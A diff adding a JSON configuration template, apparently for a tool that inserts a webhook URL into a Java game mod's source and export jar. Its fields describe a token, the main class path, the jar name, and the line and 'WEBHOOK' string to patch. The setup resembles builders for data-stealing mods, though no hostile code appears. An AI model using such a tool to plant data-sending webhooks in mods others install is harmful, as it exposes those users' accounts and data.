@@ -1,0 +1,9 @@
+{
+    "config": {
+        "token": "your token",
+        "path": "the path where your main class is found (ex : com/your/path.java)",
+        "exportname": "export name of your mod (ex. modid-1.0.jar (you can find this by going into your build.gradle file and checking the 'archivesBaseName', by default it is modid-1.0.jar))",
+        "line": "the line of code where your webhook is expected",
+        "stringname": "the name of the string where your webhook is expected (ex : String -> WEBHOOK = 'webhook here';)"
+    }
+}
